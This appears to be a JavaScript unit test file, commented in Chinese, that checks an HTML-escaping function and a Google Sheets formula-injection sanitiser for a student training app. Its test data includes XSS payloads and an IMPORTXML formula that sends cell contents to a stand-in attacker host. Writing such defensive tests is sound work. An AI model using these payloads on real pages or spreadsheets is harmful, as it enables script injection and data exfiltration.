/* 輸入安全 — XSS 跳脫與 Google Sheet 公式注入
   這些測試釘住「防護函式本身正確」；防護函式是否被套用到每個注入點，
   由 AUDIT_REPORT.md 的稽核項目追蹤（無法用單元測試涵蓋整份 DOM 產生流程）。 */
'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { loadPureFunctions, extractFunctionSource, REPO_ROOT } = require('../harness');

const { escapeHtml } = loadPureFunctions('js/03-forms-scoring.js', ['escapeHtml']);

/* Apps Script 檔案不能 require（沒有 module.exports，且整檔依賴 GAS 全域），
   所以把指定函式的原始碼切出來，在乾淨沙箱裡求值後回傳。 */
function extractBackendFn(name) {
  const src = fs.readFileSync(path.join(REPO_ROOT, 'apps-script', 'Code.gs'), 'utf8');
  const fnSrc = extractFunctionSource(src, name);
  if (!fnSrc) throw new Error(`apps-script/Code.gs 找不到函式 ${name}`);
  const ctx = vm.createContext({});
  vm.runInContext(fnSrc + '\n' + name + ';', ctx);
  return vm.runInContext(name, ctx);
}

describe('escapeHtml — 使用者輸入進入 innerHTML 前的跳脫', () => {
  test('阻擋標籤注入', () => {
    const out = escapeHtml('<img src=x onerror=alert(1)>');
    assert.ok(!out.includes('<'), '不得殘留 <');
    assert.ok(!out.includes('>'), '不得殘留 >');
    assert.strictEqual(out, '&lt;img src=x onerror=alert(1)&gt;');
  });

  test('阻擋 script 標籤', () => {
    const out = escapeHtml('<script>alert(document.cookie)</script>');
    assert.ok(!/<script/i.test(out));
  });

  test('跳脫雙引號 — 否則可從 HTML 屬性內脫逃', () => {
    const out = escapeHtml('" onmouseover="alert(1)');
    assert.ok(!out.includes('"'), '雙引號必須跳脫，否則 title="${...}" 會被脫逃');
    assert.strictEqual(out, '&quot; onmouseover=&quot;alert(1)');
  });

  test('跳脫單引號 — 否則可從單引號屬性內脫逃', () => {
    const out = escapeHtml("' onfocus='alert(1)");
    assert.ok(!out.includes("'"));
  });

  test('& 必須先跳脫，避免二次解碼繞過', () => {
    assert.strictEqual(escapeHtml('&lt;script&gt;'), '&amp;lt;script&amp;gt;');
  });

  test('null / undefined 轉成空字串而非字面 "null"', () => {
    assert.strictEqual(escapeHtml(null), '');
    assert.strictEqual(escapeHtml(undefined), '');
  });

  test('數字與中文正常通過', () => {
    assert.strictEqual(escapeHtml(123), '123');
    assert.strictEqual(escapeHtml('今天踢腿有進步'), '今天踢腿有進步');
  });
});

/* Google Sheet 公式注入：學生自由文字（心得、反思、請假理由）會被寫進儲存格。
   以 = + - @ 開頭的字串會被 Sheets 當成公式執行，=IMPORTXML 可外洩整張表。
   sanitizeCellValue_ 定義在後端 apps-script/Code.gs（GAS 沒有模組系統），
   這裡用 harness 把該函式原始碼抽出來直接測。 */
describe('Sheet 公式注入防護 — sanitizeCellValue_（apps-script/Code.gs）', () => {
  const sanitize = extractBackendFn('sanitizeCellValue_');

  const PAYLOADS = [
    '=IMPORTXML("https://evil.example/?d="&A1,"//a")',
    '=HYPERLINK("https://evil.example","click")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '=1+1'
  ];

  test('危險前綴一律被中性化，不會以公式字元開頭寫入儲存格', () => {
    for (const p of PAYLOADS) {
      const out = String(sanitize(p));
      assert.ok(!/^[=+\-@]/.test(out), `「${p}」不應以公式字元開頭寫入，實得「${out}」`);
      assert.strictEqual(out, "'" + p, '應加上強制文字前綴的單引號');
    }
  });

  test('一般中文心得原樣通過，不加任何前綴', () => {
    const normal = ['今天踢腿有進步', '教練說我下壓要再快一點', '3公斤', 'RPE 8 有點累'];
    for (const v of normal) assert.strictEqual(sanitize(v), v);
  });

  test('負數開頭的文字會被加引號（可接受的取捨）', () => {
    // 「-1」這種輸入無法區分是負數還是公式，一律當文字處理較安全。
    // 真正的數值欄位在前端就是 number，不會走到這裡。
    assert.strictEqual(sanitize('-5'), "'-5");
  });

  test('非字串型別原樣通過，不破壞既有欄位型別', () => {
    assert.strictEqual(sanitize(42), 42);
    assert.strictEqual(sanitize(true), true);
    assert.strictEqual(sanitize(null), null);
    assert.strictEqual(sanitize(undefined), undefined);
    const d = new Date('2026-06-03T00:00:00Z');
    assert.strictEqual(sanitize(d), d);
  });

  test('前導 tab / CR 也會被中性化', () => {
    assert.strictEqual(sanitize('\t=1+1'), "'\t=1+1");
  });
});
